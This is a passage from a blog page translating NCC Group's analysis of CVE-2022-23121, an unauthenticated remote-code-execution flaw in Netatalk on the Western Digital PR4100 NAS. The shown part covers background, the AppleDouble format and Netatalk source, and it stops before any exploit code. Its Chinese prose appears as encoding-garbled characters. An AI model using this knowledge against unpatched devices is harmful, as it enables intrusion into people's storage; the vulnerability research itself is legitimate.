<!DOCTYPE html><html lang="zh-CN" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="ã€ç¿»è¯‘ã€‘è¥¿éƒ¨æ•°æ®PR4100 NAS RCEæ¼æ´åˆ†æï¼ˆCVE-2022-23121ï¼‰" /><meta property="og:locale" content="zh_CN" /><meta name="description" content="æœ¬æ–‡ç¿»è¯‘è‡ªNCC Groupçš„åšå®¢ï¼Œä»‹ç»äº†è¯¥å›¢é˜Ÿåœ¨Pwn2Ownæ¯”èµ›æ—¶é’ˆå¯¹è¥¿éƒ¨æ•°æ®PR4100 NASçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨çš„ç»†èŠ‚ã€‚" /><meta property="og:description" content="æœ¬æ–‡ç¿»è¯‘è‡ªNCC Groupçš„åšå®¢ï¼Œä»‹ç»äº†è¯¥å›¢é˜Ÿåœ¨Pwn2Ownæ¯”èµ›æ—¶é’ˆå¯¹è¥¿éƒ¨æ•°æ®PR4100 NASçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨çš„ç»†èŠ‚ã€‚" /><link rel="canonical" href="https://gtrboy.github.io/posts/CVE-2022-23121/" /><meta property="og:url" content="https://gtrboy.github.io/posts/CVE-2022-23121/" /><meta property="og:site_name" content="gtrboyâ€™s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-01T11:11:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="ã€ç¿»è¯‘ã€‘è¥¿éƒ¨æ•°æ®PR4100 NAS RCEæ¼æ´åˆ†æï¼ˆCVE-2022-23121ï¼‰" /><meta name="twitter:site" content="@" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-01T11:11:00+08:00","datePublished":"2022-05-01T11:11:00+08:00","description":"æœ¬æ–‡ç¿»è¯‘è‡ªNCC Groupçš„åšå®¢ï¼Œä»‹ç»äº†è¯¥å›¢é˜Ÿåœ¨Pwn2Ownæ¯”èµ›æ—¶é’ˆå¯¹è¥¿éƒ¨æ•°æ®PR4100 NASçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨çš„ç»†èŠ‚ã€‚","headline":"ã€ç¿»è¯‘ã€‘è¥¿éƒ¨æ•°æ®PR4100 NAS RCEæ¼æ´åˆ†æï¼ˆCVE-2022-23121ï¼‰","mainEntityOfPage":{"@type":"WebPage","@id":"https://gtrboy.github.io/posts/CVE-2022-23121/"},"url":"https://gtrboy.github.io/posts/CVE-2022-23121/"}</script><title>ã€ç¿»è¯‘ã€‘è¥¿éƒ¨æ•°æ®PR4100 NAS RCEæ¼æ´åˆ†æï¼ˆCVE-2022-23121ï¼‰ | gtrboy's blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="gtrboy's blog"><meta name="application-name" content="gtrboy's blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">gtrboy's blog</a></div><div class="site-subtitle font-italic">a dead beef</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/gtrboy" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gtboy.dream','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG â€º <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>ã€ç¿»è¯‘ã€‘è¥¿éƒ¨æ•°æ®PR4100 NAS RCEæ¼æ´åˆ†æï¼ˆCVE-2022-23121ï¼‰</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>ã€ç¿»è¯‘ã€‘è¥¿éƒ¨æ•°æ®PR4100 NAS RCEæ¼æ´åˆ†æï¼ˆCVE-2022-23121ï¼‰</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> gtrboy </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, May 1, 2022, 11:11 AM +0800" prep="on" > May 1 <i class="unloaded">2022-05-01T11:11:00+08:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="9612 words">53 min</span></div></div><div class="post-content"><blockquote><p>æœ¬æ–‡ç¿»è¯‘è‡ªNCC Groupçš„<a href="https://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/">åšå®¢</a>ï¼Œä»‹ç»äº†è¯¥å›¢é˜Ÿåœ¨Pwn2Ownæ¯”èµ›æ—¶é’ˆå¯¹è¥¿éƒ¨æ•°æ®PR4100 NASçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨çš„ç»†èŠ‚ã€‚</p></blockquote><h1 id="æ¦‚è¿°">æ¦‚è¿°</h1><p>è¿™ç¯‡åšå®¢æ–‡ç« ä»‹ç»äº†2021å¹´9æœˆç”±NCC Groupçš„Exploit Development Groupï¼ˆEDGï¼‰å°ç»„ä¸­çš„<a href="https://twitter.com/alexjplaskett">Alex Plaskett</a>ï¼Œ<a href="https://twitter.com/saidelike">Cedric Halbronn</a>ä»¥åŠ<a href="https://twitter.com/fidgetingbits">Aaron Adams</a>ä¸‰äººå‘ç°å¹¶åˆ©ç”¨çš„ä¸€ä¸ªè¿”å›å€¼æœªæ£€æµ‹æ¼æ´ã€‚æˆ‘ä»¬åœ¨2021å¹´9æœˆçš„Pwn2Own 2021çš„æ¯”èµ›ä¸­æˆåŠŸåˆ©ç”¨äº†è¯¥æ¼æ´ï¼Œæ”»å‡»ç›®æ ‡æ˜¯è¥¿éƒ¨æ•°æ®PR4100 NASè®¾å¤‡ã€‚è¥¿éƒ¨æ•°æ®å‘å¸ƒäº†å‘å¸ƒäº†ä¸€ä¸ª<a href="https://os5releasenotes.mycloud.com/#/">å›ºä»¶æ›´æ–°</a>ï¼ˆ5.19.117ï¼‰ï¼Œå®Œå…¨ç§»é™¤äº†å¯¹å­˜åœ¨æ¼æ´çš„ç¬¬ä¸‰æ–¹â€œæ²¡ä»€ä¹ˆä»·å€¼çš„NetatalkæœåŠ¡â€çš„æ”¯æŒã€‚ç”±äºè¯¥æ¼æ´åœ¨<a href="https://github.com/Netatalk/Netatalk/commit/0c0465e4e85a27105b61b3918df8f8df0565367c">Netatalkä»£ç </a>ä¸­å¾—åˆ°äº†ç¡®è®¤ï¼Œå› æ­¤è¢«åˆ†é…äº†CVE-2022-23121ç¼–å·ï¼ŒåŒæ—¶ZDIå‘å¸ƒäº†å…³äºè¯¥æ¼æ´çš„ä¸€ä»½<a href="https://www.zerodayinitiative.com/advisories/ZDI-22-527/">æŠ¥å‘Š</a>å¹¶æåˆ°Netatalkå‘å¸ƒäº†æœ€æ–°çš„<a href="https://netatalk.sourceforge.io/3.1/ReleaseNotes3.1.13.html">3.1.13</a>ç‰ˆæœ¬ï¼Œä¿®å¤äº†åŒ…æ‹¬è¯¥æ¼æ´åœ¨å†…çš„å¤šä¸ªæ¼æ´ã€‚</p><h1 id="ä»‹ç»">ä»‹ç»</h1><p>è¯¥æ¼æ´å±äº<a href="https://en.wikipedia.org/wiki/Netatalk">Netatalk</a>é¡¹ç›®ï¼Œè¯¥é¡¹ç›®æ˜¯<a href="https://en.wikipedia.org/wiki/Apple_Filing_Protocol">è‹¹æœå½’æ¡£åè®®ï¼ˆApple Filing Protocolï¼ŒAFPï¼‰</a>çš„å¼€æºå®ç°ã€‚Netatalkä»£ç å®ç°äº<code class="language-plaintext highlighter-rouge">/usr/sbin/afpd</code>æœåŠ¡ä»¥åŠ<code class="language-plaintext highlighter-rouge">/lib64/libatalk.so</code>åŠ¨æ€åº“ã€‚åœ¨<a href="https://shop.westerndigital.com/products/network-attached-storage/wd-my-cloud-pro-series-pr4100#WDBNFA0000NBK-NESN">è¥¿éƒ¨æ•°æ®My Cloud Pro PR4100</a> NASè®¾å¤‡ä¸­ï¼Œ<code class="language-plaintext highlighter-rouge">afpd</code>æœåŠ¡åœ¨é»˜è®¤çŠ¶æ€ä¸‹æ˜¯æ‰“å¼€çš„ã€‚</p><p>è¯¥æ¼æ´å¯ä»¥åœ¨æ— éœ€ç»è¿‡è®¤è¯çš„å‰æä¸‹è¢«è¿œç¨‹åˆ©ç”¨ã€‚å®ƒå…è®¸ä¸€ä¸ªæ”»å‡»è€…ä»¥<code class="language-plaintext highlighter-rouge">nobody</code>ç”¨æˆ·çš„èº«ä»½åœ¨NASä¸Šè¿œç¨‹æ‰§è¡Œä»£ç ã€‚è¯¥ç”¨æˆ·å¯ä»¥è®¿é—®é€šå¸¸æƒ…å†µä¸‹éœ€è¦ç»è¿‡èº«ä»½è®¤è¯æ‰èƒ½è®¿é—®çš„ç§æœ‰å…±äº«ã€‚</p><p>æˆ‘ä»¬å·²ç»åœ¨5.17.107ç‰ˆæœ¬ä¸Šåˆ†æå¹¶åˆ©ç”¨äº†è¯¥æ¼æ´ï¼Œè¿™å°†åœ¨ä¸‹æ–‡ä¸­è¯¦ç»†è¯´æ˜ï¼Œè¯¥æ¼æ´ä¹Ÿå¯èƒ½å­˜åœ¨äºæ—§ç‰ˆæœ¬çš„å›ºä»¶ä¸­ã€‚</p><p>æ³¨æ„ï¼šè¥¿éƒ¨æ•°æ®My Cloud Pro Series PR4100 NASè®¾å¤‡æ˜¯åŸºäºx86_64æ¶æ„çš„ã€‚</p><p>æˆ‘ä»¬å°†æˆ‘ä»¬çš„åˆ©ç”¨å‘½åä¸ºâ€œæœˆé¥¼â€ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨2021å¹´9æœˆ21æ—¥å®Œæˆäº†åˆ©ç”¨ä»£ç çš„ç¼–å†™ï¼Œè¿™ä¸€å¤©æ˜¯2021å¹´çš„<a href="https://en.wikipedia.org/wiki/Mid-Autumn_Festival">ä¸­ç§‹èŠ‚</a>ã€‚</p><blockquote><p>è¯‘è€…ï¼šè¯¥æ¼æ´çš„ç ”ç©¶äººå‘˜ä¼¼ä¹äº†è§£æˆ–å–œæ¬¢ä¸­å›½æ–‡åŒ–ï¼Œæ¯”å¦‚å…¶ä¸­ä¹‹ä¸€çš„Cedric Halbronnçš„Twitter IDæ˜¯â€œsaidelikeâ€ï¼Œå³Cedricåœ¨ä¸­æ–‡ç¿»è¯‘ä¸‹çš„æ‹¼éŸ³ã€‚ä¹Ÿå¯èƒ½ä»–æœ‰ä¸€ä½å…³ç³»å¾ˆå¥½çš„ä¸­å›½æœ‹å‹/äº²äººã€‚å»å¹´ä¸­ç§‹ï¼Œæˆ‘åœ¨è¿‡èŠ‚æ‘¸é±¼ï¼Œè€Œå¤§ä½¬åœ¨æŒ–æ´ğŸ™ƒã€‚</p></blockquote><h1 id="æ¼æ´ç»†èŠ‚">æ¼æ´ç»†èŠ‚</h1><h2 id="a-èƒŒæ™¯">A. èƒŒæ™¯</h2><h3 id="dsiafp-åè®®">DSI/AFP åè®®</h3><p>è‹¹æœå½’æ¡£åè®®ï¼ˆAFPï¼‰æ˜¯çŸ¥åçš„<a href="https://en.wikipedia.org/wiki/Server_Message_Block">Server Message Blockï¼ˆSMBï¼‰</a>åè®®çš„æ›¿ä»£ï¼Œç”¨æ¥åœ¨ç½‘ç»œä¸­å…±äº«æ–‡ä»¶ã€‚AFPåè®®çš„æ ‡å‡†å¯ä»¥åœ¨<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.363.9481&amp;rep=rep1&amp;type=pdf">è¿™é‡Œ</a>æ‰¾åˆ°ã€‚</p><p>AFPé€šè¿‡<a href="https://en.wikipedia.org/wiki/Data_Stream_Interface">Data Stream Interfaceï¼ˆDSIï¼‰</a>åè®®ä¼ è¾“ï¼Œè¯¥åè®®åŸºäºTCP/IPï¼Œå¼€æ”¾åœ¨TCPçš„548ç«¯å£ã€‚</p><p>ç„¶è€Œï¼ŒSMBåè®®åœ¨æ–‡ä»¶å…±äº«ç½‘ç»œåè®®ä¸­æ›´èƒœä¸€ç­¹ï¼ŒAFPåè®®åˆ™é²œä¸ºäººçŸ¥ï¼Œå³ä½¿å®ƒä»ç„¶åœ¨NASç­‰ç½‘ç»œè®¾å¤‡ä¸Šè¢«æ”¯æŒã€‚AFPåè®®åœ¨è‹¹æœOS X 10.9ç‰ˆæœ¬ç³»ç»Ÿä¸­è¢«å¼ƒç”¨ï¼ŒAFPæœåŠ¡å™¨åˆ™åœ¨OS X 11ç‰ˆæœ¬ä¸­è¢«ç§»é™¤ã€‚</p><h3 id="netatalk">Netatalk</h3><p>Netatalké¡¹ç›®æ˜¯UNIXå¹³å°ä¸‹AFP/DSIåè®®çš„å®ç°ï¼Œå…¶ä»£ç åœ¨2000å¹´è¢«è½¬ç§»è‡³SourceForgeã€‚è¯¥é¡¹ç›®æœ€æ—©çš„ç›®æ ‡æ˜¯å…è®¸ç±»UNIXæ“ä½œç³»ç»Ÿä½œä¸ºAFPæœåŠ¡å™¨ï¼Œä¸ºè®¸å¤šMacintoshæˆ–OS Xå®¢æˆ·ç«¯æœåŠ¡ã€‚</p><p>å¦‚ä¹‹å‰æ‰€è¿°ï¼ŒAFPåè®®è¶Šæ¥è¶Šä¸å—å…³æ³¨ã€‚è¿™ä¹Ÿå½±å“åˆ°äº†Netatalké¡¹ç›®ã€‚æœ€è¿‘çš„Netatalkç¨³å®šç‰ˆæœ¬æ˜¯<a href="http://netatalk.sourceforge.net/">3.1.12</a>ï¼Œäº2018å¹´å°±å·²ç»è¢«å…¬å¼€ï¼Œè¿™æ„å‘³ç€è¿™ä¸ªé¡¹ç›®å‡ ä¹æ˜¯ä¸€ä¸ªè¢«é—å¼ƒä¸”ä¸è¢«æ”¯æŒçš„é¡¹ç›®ã€‚</p><blockquote><p>è¯‘è€…ï¼šNetatalkå½“å‰å·²æ›´æ–°è‡³<code class="language-plaintext highlighter-rouge">3.1.13</code>ç‰ˆæœ¬ã€‚</p></blockquote><p>Netatalké¡¹ç›®æ›¾å—ç¼–å·ä¸ºCVE-2018-1160æ¼æ´çš„å½±å“ï¼Œè¯¥æ¼æ´åœ¨ä½äºï¼ˆä¸åŒ…æ‹¬ï¼‰<code class="language-plaintext highlighter-rouge">3.1.12</code>ç‰ˆæœ¬çš„Netatalkä¸­å­˜åœ¨ï¼Œäº§ç”Ÿçš„åŸå› æ˜¯DSIOpensessionå‘½ä»¤ï¼ˆ<code class="language-plaintext highlighter-rouge">dsi_opensession()</code>ï¼‰ä¸­å­˜åœ¨è¶Šç•Œå†™ã€‚è¿™ä¸ªæ¼æ´æ›¾ç»è¢«ç”¨åœ¨<a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172">å¸Œæ·NAS</a>è®¾å¤‡ä¸­ï¼Œå› ä¸ºè¯¥è®¾å¤‡æ²¡æœ‰å¼€å¯ASLRï¼Œä¹‹ååœ¨<a href="https://translate.google.com/translate?sl=auto&amp;tl=en&amp;u=https://ama2in9.top/2021/01/07/cve-2018-1160/">Hitcon 2019 CTF</a>ä¸­å¼€å¯ASLRçš„ç¯å¢ƒä¸­å†æ¬¡è¢«åˆ©ç”¨ã€‚</p><blockquote><p>è¯‘è€…ï¼šå…³äº<code class="language-plaintext highlighter-rouge">CVE-2018-1160</code>æ¼æ´çš„åˆ†æï¼Œå¯è§æˆ‘çš„<a href="https://gtrboy.github.io/posts/netatalk/">ä¸Šä¸€ç¯‡</a>åšå®¢ã€‚</p></blockquote><h3 id="appledoubleæ–‡ä»¶æ ¼å¼">AppleDoubleæ–‡ä»¶æ ¼å¼</h3><p><a href="https://en.wikipedia.org/wiki/AppleSingle_and_AppleDouble_formats">AppleSingleå’ŒAppleDouble</a>æ–‡ä»¶æ ¼å¼çš„ç”¨é€”æ˜¯å­˜å‚¨æ“ä½œç³»ç»Ÿä¸­å¸¸è§„æ–‡ä»¶çš„å…ƒæ•°æ®å¹¶å…è®¸åœ¨ä¸åŒæ–‡ä»¶ç³»ç»Ÿä¸­å…±äº«è¿™äº›ä¿¡æ¯ï¼Œè€Œæ— éœ€æ‹…å¿ƒè¿™äº›ç³»ç»Ÿé—´çš„äº’æ“ä½œæ€§ã€‚</p><p>è¿™ä¸¤ä¸ªæ–‡ä»¶æ ¼å¼çš„ä¸»è¦æ€æƒ³æ˜¯åŸºäºä»¥ä¸‹äº‹å®ï¼šä»»ä½•æ–‡ä»¶ç³»ç»Ÿéƒ½å…è®¸å°†æ–‡ä»¶å­˜å‚¨ä¸ºä¸€ç³»åˆ—å­—èŠ‚ã€‚å› æ­¤ï¼Œå¯ä»¥å°†å¸¸è§„æ–‡ä»¶çš„å…ƒæ•°æ®ï¼ˆä¹Ÿå°±æ˜¯æ–‡ä»¶çš„å±æ€§ä¿¡æ¯ï¼‰ä¿å­˜åœ¨é™„åŠ æ–‡ä»¶å½“ä¸­ï¼Œå¹¶å°†è¿™äº›å±æ€§åæ˜ å›å¦ä¸€ç«¯ï¼ˆæˆ–è€…è‡³å°‘éƒ¨åˆ†å±æ€§ï¼‰ï¼Œåªè¦å¦ä¸€ç«¯çš„æ–‡ä»¶ç³»ç»Ÿæ”¯æŒå®ƒä»¬ã€‚å¦åˆ™ï¼Œè¿™äº›é™„åŠ çš„å±æ€§ä¹Ÿå¯ä»¥è¢«ä¸¢å¼ƒã€‚</p><p>AppleSingleå’ŒAppleDoubleæ ‡å‡†å¯ä»¥åœ¨<a href="https://web.archive.org/web/20180311140826/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf">è¿™é‡Œ</a>æ‰¾åˆ°ã€‚AppleDoubleæ–‡ä»¶æ ¼å¼åœ¨<a href="https://github.com/samba-team/samba/blob/master/source3/lib/adouble.c">sambaçš„æºä»£ç </a>ä¸­ä¹Ÿæœ‰æ³¨é‡Šï¼š</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>/*
   "._" AppleDouble Header File Layout:
         MAGIC          0x00051607
         VERSION        0x00020000
         FILLER         0
         COUNT          2
     .-- AD ENTRY[0]    Finder Info Entry (must be first)
  .--+-- AD ENTRY[1]    Resource Fork Entry (must be last)
  |  |   /////////////
  |  '-&gt; FINDER INFO    Fixed Size Data (32 Bytes)
  |      ~~~~~~~~~~~~~  2 Bytes Padding
  |      EXT ATTR HDR   Fixed Size Data (36 Bytes)
  |      /////////////
  |      ATTR ENTRY[0] --.
  |      ATTR ENTRY[1] --+--.
  |      ATTR ENTRY[2] --+--+--.
  |         ...          |  |  |
  |      ATTR ENTRY[N] --+--+--+--.
  |      ATTR DATA 0   &lt;-'  |  |  |
  |      ////////////       |  |  |
  |      ATTR DATA 1   &lt;----'  |  |
  |      /////////////         |  |
  |      ATTR DATA 2   &lt;-------'  |
  |      /////////////            |
  |         ...                   |
  |      ATTR DATA N   &lt;----------'
  |      /////////////
  |         ...          Attribute Free Space
  |
  '----&gt; RESOURCE FORK
            ...          Variable Sized Data
            ...
*/
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">afpd</code>äºŒè¿›åˆ¶æ–‡ä»¶å’Œ<code class="language-plaintext highlighter-rouge">libatalk.so</code>åº“æ–‡ä»¶å¹¶ä¸åŒ…å«ç¬¦å·ã€‚ç„¶è€Œï¼Œç”±äº<a href="https://en.wikipedia.org/wiki/GNU_General_Public_License">GNUå…¬å…±è®¸å¯è¯ï¼ˆGPLï¼‰</a>çš„è¦æ±‚ï¼Œè¥¿éƒ¨æ•°æ®å‘å¸ƒäº†å®ƒä»¬ä½¿ç”¨çš„<a href="https://downloads.wdc.com/gpl/WDMyCloud_PR4100_GPL_v5.16.105_20210728.tar.gz">Netatalkçš„å¼€æºå®ç°ä»¥åŠè¡¥ä¸</a>ã€‚è¥¿éƒ¨æ•°æ®å‘å¸ƒçš„æœ€æ–°çš„æºä»£ç æ¡£æ¡ˆç‰ˆæœ¬ä¸º<code class="language-plaintext highlighter-rouge">5.16.105</code>ï¼Œä¸æˆ‘ä»¬æ‰€åˆ†æçš„æœ€æ–°ç‰ˆæœ¬å›ºä»¶ï¼ˆ5.17.107ï¼‰å¹¶ä¸åŒ¹é…ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ç¡®è®¤äº†<code class="language-plaintext highlighter-rouge">afpd</code>å’Œ<code class="language-plaintext highlighter-rouge">libatalk.so</code>åœ¨åˆ°ç›®å‰ä¸ºæ­¢çš„5ä¸ªæ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¸­å¹¶æ²¡æœ‰ä»»ä½•å˜åŒ–ã€‚å› æ­¤ï¼Œæœ¬æ–‡ä¹‹åæ‰€ç¤ºçš„ä»£ç é€šå¸¸æ¥è‡ªäºNetatalkçš„æºä»£ç ã€‚</p><p>æ³¨æ„ï¼šè¥¿éƒ¨æ•°æ®PR4100ä»¥æœ€æ–°çš„<code class="language-plaintext highlighter-rouge">3.1.12</code>ç‰ˆæœ¬çš„netatalkæºä»£ç ä¸ºåŸºç¡€ã€‚</p><p>è®©æˆ‘ä»¬åˆ†æä¸€ä¸‹ï¼ŒNetatalkåœ¨æ‰“å¼€å­˜å‚¨ä¸ºAppleDoubleæ ¼å¼çš„forkæ–‡ä»¶æ—¶ï¼Œæ˜¯å¦‚ä½•æ¥å—å®¢æˆ·ç«¯è¿æ¥ã€è§£æAFPè¯·æ±‚ï¼Œä»è€Œè§¦å‘æ¼æ´ä»£ç éƒ¨çš„ã€‚</p><p><code class="language-plaintext highlighter-rouge">main()</code>å‡½æ•°å…¥å£ç‚¹åˆå§‹åŒ–äº†å¾ˆå¤šå†…å­˜å¯¹è±¡ï¼ŒåŠ è½½AFPé…ç½®ä¿¡æ¯ï¼Œå¹¶å¼€å§‹ç›‘å¬AFPç«¯å£ï¼ˆTCP 548ï¼‰ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/etc/afpd/main.c</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">ac</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">av</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="cm">/* wait for an appleshare connection. parent remains in the loop
     * while the children get handled by afp_over_{asp,dsi}.  this is
     * currently vulnerable to a denial-of-service attack if a
     * connection is made without an actual login attempt being made
     * afterwards. establishing timeouts for logins is a possible
     * solution. */</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">asev</span><span class="o">-&gt;</span><span class="n">used</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
